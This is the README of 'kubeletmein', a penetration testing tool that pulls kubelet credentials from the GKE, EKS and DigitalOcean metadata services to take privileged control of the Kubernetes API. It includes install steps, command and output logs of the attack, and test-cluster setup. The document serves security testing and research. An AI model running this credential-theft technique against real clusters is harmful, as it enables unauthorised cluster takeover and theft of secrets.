# Kubeletmein

This is a simple penetration testing tool which takes advantage of public cloud provider approaches to providing kubelet credentials to nodes in a Kubernetes cluster in order to gain privileged access to the k8s API. This access can then potentially be used to further compromise the applications running in the cluster or, in many cases, access secrets that facilitate complete control of Kubernetes.

## How it works

`kubeletmein` is a simple Go binary that is designed to be run from a pod inside your target cluster. Typically this will be either via exploiting a weakness in a web application running on Kubernetes or, perhaps an internal penetration test where the client has given you exec access into a pod. Download the single file and run it with `kubeletmein generate`.

It autodetects the provider it is being run on, reads kubelet credentials from the cloud provider metadata service and configures a kubeconfig file that you can use with `kubectl` to access the API.

There's more info in our blog post at [https://www.4armed.com/blog/hacking-kubelet-on-gke/](https://www.4armed.com/blog/hacking-kubelet-on-gke/).

## Supported providers

### GKE

GKE is fully supported when the metadata concealment is not enabled, shielded VMs are not in use and/or Workload Identity is not utilised. Out of these, only shielded VMs are a default in the most recent version of GKE at the time of writing.

### EKS

EKS support initially added by [@airman604](https://github.com/airman604) based on the AWS EKS [bootstrap script](https://github.com/awslabs/amazon-eks-ami/blob/master/files/bootstrap.sh). This has now been expanded to provide support for various different types of user-data encountered with EKS. Specifically it will support cloud-config format and shell script formats. In the latter case it tries to parse the command line arguments for `/etc/eks/bootstrap.sh` and retrieve the values it needs from there.

### Digital Ocean

By default, DO provides creds by metadata and this cannot be disabled.

### AKS

Microsoft's Azure Kubernetes Services is _not_ vulnerable to the same issue. It provides kubelet credentials to its VMs via a local file `/var/lib/waagent/ovf-env.xml`. No sensitive data relating to cluster credentials is accessible via the metadata service and, thereby, from pods deployed to nodes. You can find more information about the custom-data approach adopted by Microsoft at [https://docs.microsoft.com/en-us/azure/virtual-machines/custom-data](https://docs.microsoft.com/en-us/azure/virtual-machines/custom-data).


## Installation

It's a single binary compiled for Linux. Download it with `cURL` or `wget` from the releases page at [https://github.com/4armed/kubeletmein/releases](https://github.com/4armed/kubeletmein/releases) or use our container image [4armed/kubeletmein](https://hub.docker.com/repository/docker/4armed/kubeletmein).

## How to

There is now just a single `generate` command which will try to autodetect the cloud provider by default. You can override this with the `--provider` flag if required. Other options can be displayed using `-h`.

### GKE

```bash
root@kubeletmein-vulnerable:/# kubeletmein generate
2021-03-10T19:56:00Z [ℹ]  running autodetect
2021-03-10T19:56:00Z [ℹ]  GKE detected
2021-03-10T19:56:00Z [ℹ]  fetching kubelet creds from metadata service
2021-03-10T19:56:00Z [ℹ]  generating bootstrap-kubeconfig file at: bootstrap-kubeconfig.yaml
2021-03-10T19:56:00Z [ℹ]  wrote bootstrap-kubeconfig
2021-03-10T19:56:00Z [ℹ]  using bootstrap-config to request new cert for node: gke-kubeletmein-kubeletmein-vulnerabl-a7a330f6-3w52
2021-03-10T19:56:00Z [ℹ]  Using bootstrap kubeconfig to generate TLS client cert, key and kubeconfig file
2021-03-10T19:56:00Z [ℹ]  No valid private key and/or certificate found, reusing existing private key or creating a new one
2021-03-10T19:56:00Z [ℹ]  Waiting for client certificate to be issued
2021-03-10T19:56:01Z [ℹ]  got new cert and wrote kubeconfig
2021-03-10T19:56:01Z [ℹ]  now try: kubectl --kubeconfig kubeconfig.yaml get pods

root@kubeletmein-vulnerable:/# kubectl --kubeconfig kubeconfig.yaml get pods
NAME                     READY   STATUS    RESTARTS   AGE
kubeletmein-vulnerable   1/1     Running   0          85s
```

### EKS

```bash
root@kubeletmein-vulnerable:/# kubeletmein generate
2021-03-10T20:09:35Z [ℹ]  running autodetect
2021-03-10T20:09:35Z [ℹ]  EKS detected
2021-03-10T20:09:35Z [ℹ]  fetching cluster information from the metadata service
2021-03-10T20:09:39Z [ℹ]  parsing user-data
2021-03-10T20:09:39Z [ℹ]  wrote kubeconfig
2021-03-10T20:09:39Z [ℹ]  now try: kubectl --kubeconfig kubeconfig.yaml get pods

root@kubeletmein-vulnerable:/# kubectl --kubeconfig kubeconfig.yaml get pods
NAME                     READY   STATUS    RESTARTS   AGE
kubeletmein-vulnerable   1/1     Running   0          8m46s
```

### DigitalOcean

```bash
root@kubeletmein-vulnerable:/# kubeletmein generate
2021-03-10T11:57:53Z [ℹ]  running autodetect
2021-03-10T11:57:53Z [ℹ]  DigitalOcean detected
2021-03-10T11:57:53Z [ℹ]  fetching kubelet creds from metadata service
2021-03-10T11:57:53Z [ℹ]  generating bootstrap-kubeconfig file at: bootstrap-kubeconfig.yaml
2021-03-10T11:57:53Z [ℹ]  wrote bootstrap-kubeconfig
2021-03-10T11:57:53Z [ℹ]  using bootstrap-config to request new cert for node: kubeletmein-pool-87nm2
2021-03-10T11:57:53Z [ℹ]  Using bootstrap kubeconfig to generate TLS client cert, key and kubeconfig file
2021-03-10T11:57:53Z [ℹ]  Waiting for client certificate to be issued
2021-03-10T11:57:53Z [ℹ]  got new cert and wrote kubeconfig
2021-03-10T11:57:53Z [ℹ]  now try: kubectl --kubeconfig kubeconfig.yaml get pods

root@kubeletmein-vulnerable:/# kubectl --kubeconfig kubeconfig.yaml get pods
NAME                     READY   STATUS    RESTARTS   AGE
kubeletmein-vulnerable   1/1     Running   0          2m30s
```

## Testing

### Terraform

To simplify the process, if you want to fire up some clusters to test this on, there are example Terraform configurations provided in the `deploy/terraform` directory. There is one per cloud provider supported. You will need to provide credentials for the provider. If you're not sure how to do this head over to the Terraform website and checkout the relevant provider docs.

- AWS - [https://registry.terraform.io/providers/hashicorp/aws/latest/docs](https://registry.terraform.io/providers/hashicorp/aws/latest/docs)

- GCP - [https://registry.terraform.io/providers/hashicorp/google/latest/docs](https://registry.terraform.io/providers/hashicorp/google/latest/docs)

- Digital Ocean - [https://registry.terraform.io/providers/digitalocean/digitalocean/latest/docs](https://registry.terraform.io/providers/digitalocean/digitalocean/latest/docs)

Each folder has a `Makefile` you can use if you wish to init, plan and apply the configs. You can update the `terraform.tfvars` with the necessary changes or set `TF_VAR_xx` variables. However you prefer.

The plans will create a cluster and then deploy the `4armed/kubeletmein` container image in a pod. You can then exec into this pod and run the tool. Here is output from running this on GKE.

```bash
$ kubectl exec -ti kubeletmein-vulnerable -- bash
root@kubeletmein-vulnerable:/# kubeletmein generate
2021-03-10T19:56:00Z [ℹ]  running autodetect
2021-03-10T19:56:00Z [ℹ]  GKE detected
2021-03-10T19:56:00Z [ℹ]  fetching kubelet creds from metadata service
2021-03-10T19:56:00Z [ℹ]  generating bootstrap-kubeconfig file at: bootstrap-kubeconfig.yaml
2021-03-10T19:56:00Z [ℹ]  wrote bootstrap-kubeconfig
2021-03-10T19:56:00Z [ℹ]  using bootstrap-config to request new cert for node: gke-kubeletmein-kubeletmein-vulnerabl-a7a330f6-3w52
2021-03-10T19:56:00Z [ℹ]  Using bootstrap kubeconfig to generate TLS client cert, key and kubeconfig file
2021-03-10T19:56:00Z [ℹ]  No valid private key and/or certificate found, reusing existing private key or creating a new one
2021-03-10T19:56:00Z [ℹ]  Waiting for client certificate to be issued
2021-03-10T19:56:01Z [ℹ]  got new cert and wrote kubeconfig
2021-03-10T19:56:01Z [ℹ]  now try: kubectl --kubeconfig kubeconfig.yaml get pods

root@kubeletmein-vulnerable:/# kubectl --kubeconfig kubeconfig.yaml get pods
NAME                     READY   STATUS    RESTARTS   AGE
kubeletmein-vulnerable   1/1     Running   0          85s
```

## Contributing

Please submit pull requests on a separate branch. We welcome all improvements. It's not the world's best bit of code.

Please raise issues on GitHub if you find any, including feature requests.

## Disclaimer

This is intended for professional security testing or research. We subscribe to the DBAD philosophy.
